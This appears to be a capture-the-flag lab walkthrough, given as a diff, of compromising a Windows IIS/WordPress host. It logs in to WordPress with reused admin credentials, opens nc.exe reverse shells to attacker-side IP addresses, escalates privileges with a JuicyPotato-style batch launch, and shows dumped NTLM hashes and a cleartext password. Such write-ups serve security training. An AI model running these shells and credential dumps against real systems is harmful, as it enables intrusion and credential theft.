@@ -1,0 +1,44 @@
+nmap -sC -sV 10.10.10.29
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+-----------------------------------------------------------------------------
+dirb http://10.10.10.29
+nikto -h 10.10.10.29
+------------------------------------------------------------------------------
+
+Found a directory called wordpress
+It revealed a page
+Exploring the website I found a login page
+
+Using the password from vaccine got access with P@s5w0rd! as password and user as admin
+
+There is a msf module to exploit wordpress to get a shell
+execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"
+
+echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.28 1111 > shell7.bat
+
+js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell7.bat -l 1337 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}
+
+        msv :
+         [00000003] Primary
+         * Username : sandra
+         * Domain   : MEGACORP
+         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
+         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
+         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
+        tspkg :
+        wdigest :
+         * Username : sandra
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : sandra
+         * Domain   : MEGACORP.LOCAL
+         * Password : Password1234!
